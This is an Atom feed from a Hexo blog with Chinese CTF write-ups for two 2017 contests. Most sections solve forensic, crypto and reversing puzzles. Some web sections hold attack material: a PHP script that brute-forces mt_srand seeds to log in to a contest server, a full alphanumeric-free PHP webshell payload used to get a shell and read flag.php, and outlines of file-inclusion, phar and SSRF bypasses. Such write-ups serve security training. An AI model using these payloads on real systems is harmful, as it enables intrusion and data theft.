<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>1ABlades&#39; blog</title>
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="1ablades.github.io/"/>
  <updated>2017-12-03T07:12:06.002Z</updated>
  <id>1ablades.github.io/</id>
  
  <author>
    <name>1ABlades</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>2017湖湘杯writeup</title>
    <link href="1ablades.github.io/2017/12/03/2017%E6%B9%96%E6%B9%98%E6%9D%AFwriteup/"/>
    <id>1ablades.github.io/2017/12/03/2017湖湘杯writeup/</id>
    <published>2017-12-03T07:09:43.000Z</published>
    <updated>2017-12-03T07:12:06.002Z</updated>
    
    <content type="html"><![CDATA[<p>部分题解</p>
<h3 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h3><p>导出http 发现有个flag.zip<br>解压后文件内容是rgb的像素点<br>脚本：<br><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#-*- coding:utf-8 -*-</span></div><div class="line"><span class="built_in">from</span> PIL import Image</div><div class="line">import re</div><div class="line"></div><div class="line"><span class="keyword">a</span>=<span class="number">98457</span></div><div class="line"><span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">1</span>, <span class="keyword">a</span>+<span class="number">1</span>):</div><div class="line">    <span class="keyword">if</span> (<span class="keyword">a</span> % k == <span class="number">0</span>) <span class="keyword">and</span> (k &lt; <span class="keyword">a</span>):</div><div class="line">        x = k</div><div class="line">        y = int(<span class="keyword">a</span><span class="comment"> // k)</span></div><div class="line">        print x,y</div><div class="line">        im = Image.<span class="built_in">new</span>(<span class="string">"RGB"</span>,(x,y))</div><div class="line">        <span class="built_in">file</span> = <span class="built_in">open</span>(<span class="string">'ce.txt'</span>)</div><div class="line"></div><div class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,x):</div><div class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,y):</div><div class="line">                <span class="built_in">line</span> = <span class="built_in">file</span>.readline()<span class="comment">#</span></div><div class="line">                rgb = <span class="built_in">line</span>.<span class="built_in">split</span>(<span class="string">","</span>)</div><div class="line">                im.putpixel((i,j),(int(rgb[<span class="number">0</span>]),int(rgb[<span class="number">1</span>]),int(rgb[<span class="number">2</span>])))</div><div class="line">        im.show()</div></pre></td></tr></table></figure></p>
<h3 id="Re4newer"><a href="#Re4newer" class="headerlink" title="Re4newer"></a>Re4newer</h3><p>ida打开<br>定位到判断函数<br><img src="http://ouiii5myz.bkt.clouddn.com/mdimg/171203/07IK0Lkhe0.png" alt="mark"></p>
<p>flag 是v4和0x22的异或  </p>
<p><img src="http://ouiii5myz.bkt.clouddn.com/mdimg/171203/iLLflhhIIb.png" alt="mark"></p>
<p>然后web狗手撕的 :)</p>
<h3 id="Misc200"><a href="#Misc200" class="headerlink" title="Misc200"></a>Misc200</h3><p>当时没做出来，因为没有去调试。。<br>拖到jeb里看一下有一个加密，一个解密文件，解密文件没东西，看了下加密，就是普通的和密码进行异或。所以就是要找到password，并没有找到。<br>我们进行调试，在加密一下就可以得到原文了，而且发现此时密码已经记住，然后把加密文件扔进去，就可以得到flag图片了</p>
<h3 id="pyc分析"><a href="#pyc分析" class="headerlink" title="pyc分析"></a>pyc分析</h3><p>2015xdctf原题<br><code>uncompyle6 revPyc.pyc</code></p>
<p>反编译出源码</p>
<p>查看globals()</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">Traceback (most recent <span class="keyword">call</span> <span class="keyword">last</span>):</div><div class="line">  <span class="keyword">File</span> <span class="string">"&lt;stdin&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;<span class="keyword">module</span>&gt;</div><div class="line">  <span class="keyword">File</span> <span class="string">"&lt;stdin&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;lambda&gt;</div><div class="line">IOError: [Errno <span class="number">2</span>] <span class="keyword">No</span> such <span class="keyword">file</span> <span class="keyword">or</span> <span class="keyword">directory</span>: <span class="string">'flag.txt'</span></div><div class="line">&gt;&gt;&gt; globals()</div><div class="line">&#123;<span class="string">'string'</span>: &lt;<span class="keyword">module</span> <span class="string">'string'</span> <span class="keyword">from</span> <span class="string">'D:\Python27\lib\string.pyc'</span>&gt;, <span class="string">'__builtins__'</span>: &lt;<span class="keyword">module</span> <span class="string">'__builtin__'</span> (built-<span class="keyword">in</span>)&gt;, <span class="string">'__package__'</span>: <span class="keyword">None</span>, <span class="string">'i'</span>: <span class="number">654</span>, <span class="string">'table'</span>: <span class="string">'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&amp;\'()*+,-./:;&lt;=&gt;?@[\\]^_`&#123;|&#125;~'</span>, <span class="string">'encode'</span>: &lt;<span class="keyword">function</span> <span class="keyword">encode</span> <span class="keyword">at</span> <span class="number">0x02836C30</span>&gt;, <span class="string">'__name__'</span>: <span class="string">'__main__'</span>, <span class="string">'getbit'</span>: &lt;<span class="keyword">function</span> getbit <span class="keyword">at</span> <span class="number">0x028364B0</span>&gt;, <span class="string">'__doc__'</span>: <span class="keyword">None</span>, <span class="string">'setbit'</span>: &lt;<span class="keyword">function</span> setbit <span class="keyword">at</span> <span class="number">0x02815E30</span>&gt;&#125;</div></pre></td></tr></table></figure>
<p>整理完代码</p>
<figure class="highlight scheme"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">[<span class="name">data</span>[<span class="symbol">'i</span>'] = ((<span class="name">table.index</span>(<span class="name">data</span>[<span class="symbol">'i</span>']) + <span class="number">1</span>))</div><div class="line">__this() for __l[<span class="symbol">'buf</span>'] in [(</div><div class="line">             j=(<span class="name">i</span> / <span class="number">6</span>) * <span class="number">8</span> + (<span class="name">i</span> % <span class="number">6</span>)</div><div class="line">             setbit(<span class="name">buf</span>, i, getbit(<span class="name">data</span>, j))</div><div class="line"></div><div class="line">              if __i is not __sentinel else __after())(<span class="name">next</span>(<span class="name">__items</span>, __sentinel)))())</div><div class="line"></div><div class="line">        (<span class="name">iter</span>(<span class="name">xrange</span>((<span class="name">__l</span>[<span class="symbol">'_len</span>'] * <span class="number">6</span>)))</div><div class="line"></div><div class="line"> for __g[<span class="symbol">'table</span>'] in [(<span class="name">string.printable.strip</span>())]][<span class="name">0</span>] for __g[<span class="symbol">'string</span>'] in [(<span class="name">__import__</span>(<span class="symbol">'string</span>', __g, __g))]][<span class="name">0</span>])(<span class="name">globals</span>(), (<span class="name"><span class="builtin-name">lambda</span></span> <span class="name">f:</span> (lambda x: x(x))(<span class="name"><span class="builtin-name">lambda</span></span> <span class="name">y:</span> <span class="name">f</span>(lambda: y(y)()))))</div></pre></td></tr></table></figure>
<p>加密方式就出来了，把原字符在table的index+1后，把后6位保存到文件里,由于6<em>4==3</em>8，我就每3字节一起decode，decode3b函数</p>
<p>exp</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div></pre></td><td class="code"><pre><div class="line">python</div><div class="line"><span class="section">#Embedded file name: rev300.py</span></div><div class="line">__g = globals()</div><div class="line">__y = (lambda f: (lambda x: x(x))(lambda y: f(lambda : y(y)())))</div><div class="line">string = (<span class="strong">__import__</span>('string', <span class="strong">__g, __</span>g))</div><div class="line">table = (string.printable.strip())</div><div class="line">"""</div><div class="line">setbit = (lambda p, pos, value: (lambda <span class="strong">__l: [ [ [ (lambda __</span>target, <span class="strong">__slice, __</span>value: [<span class="string"> (lambda __target, __slice, __value: [ __l['p'</span>] for <span class="strong">__target[__</span>slice] in [<span class="string">(lambda __old: (lambda __ret: (__old | __value if __ret is NotImplemented else __ret))(getattr(__old, '__ior__', lambda other: NotImplemented)(__value)))(__target[__slice</span>])] ][<span class="string">0</span>])(<span class="strong">__l['p'], __</span>l[<span class="string">'cpos'</span>], <span class="strong">__l['value'] &lt;&lt; __</span>l[<span class="string">'bpos'</span>]) for <span class="strong">__target[__</span>slice] in [<span class="string">(lambda __old: (lambda __ret: (__old &amp; __value if __ret is NotImplemented else __ret))(getattr(__old, '__iand__', lambda other: NotImplemented)(__value)))(__target[__slice</span>])] ][<span class="string">0</span>])(<span class="strong">__l['p'], __</span>l[<span class="string">'cpos'</span>], ~(1 <span class="xml"><span class="tag">&lt;&lt; <span class="attr">__l</span>['<span class="attr">bpos</span>'])) <span class="attr">for</span> <span class="attr">__l</span>['<span class="attr">bpos</span>'] <span class="attr">in</span> [<span class="attr">__l</span>['<span class="attr">pos</span>'] % <span class="attr">8</span>] ][<span class="attr">0</span>] <span class="attr">for</span> <span class="attr">__l</span>['<span class="attr">cpos</span>'] <span class="attr">in</span> [<span class="attr">__l</span>['<span class="attr">pos</span>'] / <span class="attr">8</span>] ][<span class="attr">0</span>] <span class="attr">for</span> <span class="attr">__l</span>['<span class="attr">p</span>'], <span class="attr">__l</span>['<span class="attr">pos</span>'], <span class="attr">__l</span>['<span class="attr">value</span>'] <span class="attr">in</span> [(<span class="attr">p</span>, <span class="attr">pos</span>, <span class="attr">value</span>)] ][<span class="attr">0</span>])(&#123;&#125;))</span></span></div><div class="line"><span class="xml">setbit.__name__ = 'setbit'</span></div><div class="line"><span class="xml">getbit = (lambda p, pos: (lambda __l: [ [ [ __l['p'][__l['cpos']] &gt;</span>&gt; <span class="strong">__l['bpos'] &amp; 1 for __</span>l[<span class="string">'bpos'</span>] in [<span class="string">__l['pos'</span>] % 8] ][<span class="string">0</span>] for <span class="strong">__l['cpos'] in [__</span>l[<span class="string">'pos'</span>] / 8] ][<span class="string">0</span>] for <span class="strong">__l['p'], __</span>l[<span class="string">'pos'</span>] in [<span class="string">(p, pos)</span>] ][0])(&#123;&#125;))</div><div class="line">getbit.<span class="strong">__name__</span> = 'getbit'</div><div class="line">encode =  (lambda data, buf: (lambda <span class="strong">__l: [ [ (lambda __</span>items, <span class="strong">__after, __</span>sentinel: <span class="strong">__y(lambda __</span>this: lambda : (lambda <span class="strong">__i: ([ [ __</span>this() for <span class="strong">__l['data'][__</span>l[<span class="string">'i'</span>]] in [<span class="string">table.index(__l['data'</span>][<span class="symbol">__l['i'</span>]]) + 1] ][<span class="string">0</span>] for <span class="strong">__l['i'] in [__</span>i] ][<span class="string">0</span>] if <span class="strong">__i is not __</span>sentinel else <span class="strong">__after()))(next(__</span>items, <span class="strong">__sentinel)))())(iter(xrange(__</span>l[<span class="string">'_len'</span>])), lambda : (lambda <span class="strong">__items, __</span>after, <span class="strong">__sentinel: __</span>y(lambda <span class="strong">__this: lambda : (lambda __</span>i: ([<span class="string"> [ [ __this() for __l['buf'</span>] in [<span class="string">setbit(__l['buf'</span>], <span class="strong">__l['i'], getbit(__</span>l[<span class="string">'data'</span>], <span class="strong">__l['j']))] ][0] for __</span>l[<span class="string">'j'</span>] in [<span class="string">__l['i'</span>] / 6 <span class="bullet">* 8 + __l['i'] % 6] ][0] for __l['i'] in [__i] ][0] if __i is not __sentinel else __after()))(next(__items, __sentinel)))())(iter(xrange(__l['_len'] *</span> 6)), lambda : <span class="strong">__l['buf'], []), []) for __</span>l[<span class="string">'_len'</span>] in [<span class="string">len(__l['data'</span>])] ][<span class="string">0</span>] for <span class="strong">__l['data'], __</span>l[<span class="string">'buf'</span>] in [<span class="string">(data, buf)</span>] ][0])(&#123;&#125;))</div><div class="line">encode.<span class="strong">__name__</span> = 'encode'</div><div class="line">"""</div><div class="line">def setbit(p,pos,value):</div><div class="line"><span class="code">    bpos = pos % 8</span></div><div class="line"><span class="code">    cpos = pos / 8</span></div><div class="line"><span class="code">    s = p</span></div><div class="line"><span class="code">    s[cpos] = p[cpos] &amp; (~(1 &lt;&lt; bpos))</span></div><div class="line"><span class="code">    s[cpos] = p[cpos] | (value &lt;&lt; bpos)</span></div><div class="line"><span class="code">    return s</span></div><div class="line">def getbit(p,pos):</div><div class="line"><span class="code">    bpos = pos % 8</span></div><div class="line"><span class="code">    cpos = pos / 8</span></div><div class="line"><span class="code">    return p[cpos] &gt;&gt; bpos &amp; 1</span></div><div class="line">def encode(data, buf):</div><div class="line"><span class="code">    indexdata = []</span></div><div class="line"><span class="code">    for i in xrange(len(data)):</span></div><div class="line"><span class="code">        indexdata.append(table.index(data[i]) + 1)</span></div><div class="line"><span class="code">    res = buf</span></div><div class="line"><span class="code">    for i in xrange(len(data)*6):</span></div><div class="line"><span class="code">        j = i / 6 * 8 + i % 6</span></div><div class="line"><span class="code">        setbit(res, i, getbit(indexdata, j))</span></div><div class="line"><span class="code">    return res</span></div><div class="line">def encrypt():</div><div class="line"><span class="code">    fin = open('key.txt', 'r')</span></div><div class="line"><span class="code">    s = fin.read().strip()</span></div><div class="line"><span class="code">    fin.close()</span></div><div class="line"><span class="code">    ss = ([])</span></div><div class="line"><span class="code">    sss = ([])</span></div><div class="line"><span class="code">    __items = iter(s)</span></div><div class="line"><span class="code">    __after = (lambda : [ [ (lambda __items, __after, __sentinel: __y(lambda __this: lambda : (lambda __i: ([ (lambda __value: [ __this() for __g['sssss'] in [(lambda __ret: (__g['sssss'] + __value if __ret is NotImplemented else __ret))(getattr(__g['sssss'], '__iadd__', lambda other: NotImplemented)(__value))] ][0])(chr(c)) for __g['c'] in [__i] ][0] if __i is not __sentinel else __after()))(next(__items, __sentinel)))())(iter(ssss), lambda : [ (fout.write(sssss), (fout.close(), None)[1])[1] for __g['fout'] in [open('key1.enc', 'wb+')] ][0], []) for __g['sssss'] in [''] ][0] for __g['ssss'] in [encode(ss, sss)] ][0])</span></div><div class="line"><span class="code">    __sentinel = ([])</span></div><div class="line"><span class="code">    __y(lambda __this: lambda : (lambda __i: ([ (ss.append(c), (sss.append(0), __this())[1])[1] for __g['c'] in [__i] ][0] if __i is not __sentinel else __after()))(next(__items, __sentinel)))()</span></div><div class="line">def decrypt():</div><div class="line"><span class="code">    fin = open('key.enc','rb')</span></div><div class="line"><span class="code">    cipher = fin.read()</span></div><div class="line"><span class="code">    plain = ''</span></div><div class="line"><span class="code">    def decode3b(s):</span></div><div class="line"><span class="code">        a = s &gt;&gt; 16</span></div><div class="line"><span class="code">        b = (s &gt;&gt; 8) &amp; 0xFF</span></div><div class="line"><span class="code">        c = s &amp; 0xff</span></div><div class="line"><span class="code">        sa = bin(a)[2:].zfill(8)</span></div><div class="line"><span class="code">        sb = bin(b)[2:].zfill(8)</span></div><div class="line"><span class="code">        sc = bin(c)[2:].zfill(8)</span></div><div class="line"><span class="code">        return table[int(sa[2:], 2)] + table[int(sb[4:] + sa[:2], 2)] + table[int(sc[6:] + sb[:4], 2)] + table[int(sc[:6], 2)]</span></div><div class="line"><span class="code">    for i in xrange(0,len(cipher),3):</span></div><div class="line"><span class="code">        s = int(cipher[i:i+3].encode('hex'),16)</span></div><div class="line"><span class="code">        plain += decode3b(s)</span></div><div class="line"><span class="code">    print plain</span></div><div class="line"><span class="code">    return ''.join(table[(table.index(c) + 63) % 64] for c in plain)</span></div><div class="line">if <span class="strong">__name__</span> == '<span class="strong">__main__</span>':</div><div class="line"></div><div class="line"><span class="code">    print decrypt()</span></div><div class="line"><span class="code">    print table[table.index("d")+64]</span></div><div class="line"><span class="code">    #Key:9733c070b2138e5f</span></div></pre></td></tr></table></figure>
<p>由于只保留了最后6位，所以在table里的index大于64的特殊字符是没有的，key后面的d其实是:</p>
<h3 id="web200"><a href="#web200" class="headerlink" title="web200"></a>web200</h3><p>根据<a href="http://118.190.87.135:10080/?op=home" target="_blank" rel="external">http://118.190.87.135:10080/?op=home</a><br>尝试文件包含 ../ 关键字被禁<br>使用php filter 读取文件<br>common.php 发现自动添加.png后缀  </p>
<p> <img src="http://ouiii5myz.bkt.clouddn.com/mdimg/171203/bkkCm7CJ0f.png" alt="mark"></p>
<p>可以使用phar协议绕过</p>
<p><img src="http://ouiii5myz.bkt.clouddn.com/mdimg/171203/4faB3ai3kI.png" alt="mark"></p>
<p>但是php 命令执行相关函数被禁 可以使用php函数读取</p>
<p><img src="http://ouiii5myz.bkt.clouddn.com/mdimg/171203/b9lclgC8H8.png" alt="mark"></p>
<p><img src="http://ouiii5myz.bkt.clouddn.com/mdimg/171203/GgBh1FkGEb.png" alt="mark"></p>
<h3 id="简单的安卓"><a href="#简单的安卓" class="headerlink" title="简单的安卓"></a>简单的安卓</h3><p>jeb载入 即可  </p>
<p><img src="http://ouiii5myz.bkt.clouddn.com/mdimg/171203/9I19aC5CIE.png" alt="mark"></p>
<h3 id="热身运动"><a href="#热身运动" class="headerlink" title="热身运动"></a>热身运动</h3><p>gif 一帧帧的看</p>
<p>发现坐标可以和base64 一一对应 最后=补全即可</p>
<p>ZmxhZ3sxdF8xNV9mdW5ueX0=</p>
<p>flag{1t_15_funny}</p>
<h3 id="random"><a href="#random" class="headerlink" title="random"></a>random</h3><p>.index.php.swp<br>发现源码泄露</p>
<p><img src="http://ouiii5myz.bkt.clouddn.com/mdimg/171203/cF2L1Dh0dc.png" alt="mark"></p>
<p>简单的mt_srand随机数爆破 session置空的绕过</p>
<p>脚本如下<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?php</span></span></div><div class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">create_password</span><span class="params">($pw_length = <span class="number">10</span>)</span></span>&#123; $randpwd = <span class="string">""</span>; <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; $pw_length; $i++)&#123; $randpwd .= chr(mt_rand(<span class="number">100</span>, <span class="number">200</span>)); &#125; <span class="keyword">return</span> $randpwd; &#125; $t = time()<span class="number">-20</span>; <span class="keyword">for</span>($i = $t; $i &lt; $t + <span class="number">40</span>; $i++)&#123; mt_srand($i); $pwd=create_password(); $curl = file_get_contents(<span class="string">"http://114.215.138.89:10080/index.php?pwd=$pwd&amp;login="</span>); <span class="keyword">echo</span> $curl.<span class="string">'&lt;br&gt;'</span>; &#125;</span></div></pre></td></tr></table></figure></p>
<h3 id="web300"><a href="#web300" class="headerlink" title="web300"></a>web300</h3><p><img src="http://ouiii5myz.bkt.clouddn.com/mdimg/171203/GjGcHa903a.png" alt="mark"></p>
<p>阅读源码 构造不含上述字符的shell即可</p>
<p>根据p牛博客<br><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html" target="_blank" rel="external">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</a></p>
<p>‘a’++ =&gt; ‘b’，’b’++ =&gt; ‘c’… 所以，我们只要能拿到一个变量，其值为a，通过自增操作即可获得a-z中所有字符。<br>那么，如何拿到一个值为字符串’a’的变量呢？<br>巧了，数组（Array）的第一个字母就是大写A，而且第4个字母是小写a。也就是说，我们可以同时拿到小写和大写A，等于我们就可以拿到a-z和A-Z的所有字母。<br>在PHP中，如果强制连接数组和字符串的话，数组将被转换成字符串，其值为Array：<br>再取这个字符串的第一个字母，就可以获得’A’了<br>payload:<br>    <a href="http://127.0.0.1:8000/web300.php?content=$_=[].&#39;&#39;;$_=$_[&#39;]&#39;==&#39;[&#39;];$___=$_;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$____=&#39;_&#39;;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$_=$$____;$___($_[_" target="_blank" rel="external">http://127.0.0.1:8000/web300.php?contenta>]);</p>
<p>url 编码一下 提交<br>getshell<br>cat flag.php  </p>
<p><img src="http://ouiii5myz.bkt.clouddn.com/mdimg/171203/cAH0IkgdfI.png" alt="mark"></p>
<h3 id="Misc300"><a href="#Misc300" class="headerlink" title="Misc300"></a>Misc300</h3><p>脚本：<br><figure class="highlight processing"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> pickle</div><div class="line">from PIL <span class="keyword">import</span> Image</div><div class="line"></div><div class="line">with <span class="built_in">open</span>(<span class="string">'pixels.jpg.pkl'</span>) as f:</div><div class="line">       data= pickle.loads(f.read().encode(<span class="string">'utf8'</span>))</div><div class="line"></div><div class="line">white_pixels = [(<span class="built_in">int</span>(e[<span class="number">0</span>]), <span class="built_in">int</span>(e[<span class="number">1</span>])) <span class="keyword">for</span> e in data[<span class="number">1</span>:]]</div><div class="line"><span class="built_in">width</span> = <span class="built_in">max</span>([p[<span class="number">0</span>] <span class="keyword">for</span> p in white_pixels]) + <span class="number">10</span></div><div class="line"><span class="built_in">height</span> = <span class="built_in">max</span>([p[<span class="number">1</span>] <span class="keyword">for</span> p in white_pixels])+ <span class="number">10</span></div><div class="line"></div><div class="line"><span class="built_in">image</span> = Image.<span class="keyword">new</span>(<span class="string">'1'</span>, (<span class="built_in">width</span>, <span class="built_in">height</span>), <span class="number">0</span>)</div><div class="line"><span class="built_in">pixels</span> = <span class="built_in">image</span>.load()</div><div class="line"></div><div class="line"><span class="keyword">for</span> pixel in white_pixels:</div><div class="line">       <span class="built_in">pixels</span>[pixel[<span class="number">0</span>],pixel[<span class="number">1</span>]] = <span class="number">255</span></div><div class="line"></div><div class="line"><span class="built_in">image</span>.show()</div></pre></td></tr></table></figure></p>
<p><img src="http://ouiii5myz.bkt.clouddn.com/mdimg/171203/j30JE5mF8e.png" alt="mark"></p>
<p>漫画图作者为billwatterson，就是flag</p>
<h3 id="web400"><a href="#web400" class="headerlink" title="web400"></a>web400</h3><p>这个题好像没人做出来。。。<br>赛后听人说是先用ssrf 302读文件，上传文件页面需要session[‘token’]=1，然后开启debug请求user.php获取session，利用session上传文件,common.php可以自动包含文件，include参数加入赋值等于upload，会自动包含ini文件。<br>没有环境也没有复现。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;部分题解&lt;/p&gt;
&lt;h3 id=&quot;流量分析&quot;&gt;&lt;a href=&quot;#流量分析&quot; class=&quot;headerlink&quot; title=&quot;流量分析&quot;&gt;&lt;/a&gt;流量分析&lt;/h3&gt;&lt;p&gt;导出http 发现有个flag.zip&lt;br&gt;解压后文件内容是rgb的像素点&lt;br&gt;脚本：&lt;br&gt;&lt;
    
    </summary>
    
    
      <category term="writeup" scheme="1ablades.github.io/tags/writeup/"/>
    
  </entry>
  
  <entry>
    <title>2017山东大学生网络安全技能大赛决赛writeup.md</title>
    <link href="1ablades.github.io/2017/11/07/2017%E5%B1%B1%E4%B8%9C%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%86%B3%E8%B5%9Bwriteup/"/>
    <id>1ablades.github.io/2017/11/07/2017山东大学生网络安全技能大赛决赛writeup/</id>
    <published>2017-11-07T08:41:53.000Z</published>
    <updated>2017-11-07T08:42:44.572Z</updated>
    
    <content type="html"><![CDATA[<p>部分题目writeup</p>
<h3 id="base家族"><a href="#base家族" class="headerlink" title="base家族"></a>base家族</h3><p>base32和64交替加密，脚本泡一下<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">import base64</div><div class="line"></div><div class="line"><span class="attribute">f</span>=open("base.txt","r")</div><div class="line"><span class="attribute">s</span>=f.read()</div><div class="line">f.close()</div><div class="line"></div><div class="line"><span class="keyword">while</span> <span class="literal">True</span>:</div><div class="line">    <span class="keyword">if</span> <span class="string">"flag"</span> <span class="keyword">in</span> s:</div><div class="line">        break</div><div class="line">    try:</div><div class="line">        <span class="attribute">s</span>=base64.b32decode(s)</div><div class="line">    except:</div><div class="line">        <span class="attribute">s</span>=base64.b64decode(s)</div><div class="line"></div><div class="line"><span class="builtin-name">print</span> s</div></pre></td></tr></table></figure></p>
<h3 id="gakki"><a href="#gakki" class="headerlink" title="gakki"></a>gakki</h3><p>利用winhex修改一下图片大小</p>
<p><img src="http://ouiii5myz.bkt.clouddn.com/mdimg/171106/i30CHgl6d2.png" alt="mark"></p>
<p>即可得到flag</p>
<p><img src="http://ouiii5myz.bkt.clouddn.com/mdimg/171106/GkAH7kJf4A.png" alt="mark"></p>
<h3 id="hacker"><a href="#hacker" class="headerlink" title="hacker"></a>hacker</h3><p>用stegsolve可得到二维码<br>扫描得到flag</p>
<h3 id="磁盘镜像"><a href="#磁盘镜像" class="headerlink" title="磁盘镜像"></a>磁盘镜像</h3><p>binwalk了一下发现有图片<br>foremost分离出来即可得到flag</p>
<h3 id="黑客留下的机密信息"><a href="#黑客留下的机密信息" class="headerlink" title="黑客留下的机密信息"></a>黑客留下的机密信息</h3><p>分析流量包可知黑客上传了shell<br>有一条流量<br><img src="http://ouiii5myz.bkt.clouddn.com/mdimg/171106/LHJ31gKDb9.png" alt="mark"><br>z2的值base64解一下就是flag</p>
<h3 id="机密信息"><a href="#机密信息" class="headerlink" title="机密信息"></a>机密信息</h3><p>apache的日志，用apachelogview看一下，发现是盲注<br>注入得到的字符串就是flag</p>
<h3 id="颜文字"><a href="#颜文字" class="headerlink" title="颜文字"></a>颜文字</h3><p>放到浏览器console运行一下</p>
<h3 id="小明的生日"><a href="#小明的生日" class="headerlink" title="小明的生日"></a>小明的生日</h3><figure class="highlight processing"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">-*- coding:utf<span class="number">-8</span> -*-</div><div class="line"><span class="keyword">import</span> hashlib</div><div class="line">s = <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span></div><div class="line"></div><div class="line"><span class="keyword">for</span> i in range(<span class="number">1</span>,<span class="number">13</span>):</div><div class="line">    <span class="keyword">for</span> j in range(<span class="number">1</span>,<span class="number">32</span>):</div><div class="line"></div><div class="line">        <span class="keyword">if</span> i &lt; <span class="number">10</span>:</div><div class="line">            i=<span class="string">'0'</span>+<span class="built_in">str</span>(i)</div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            i=<span class="built_in">str</span>(i)</div><div class="line">        <span 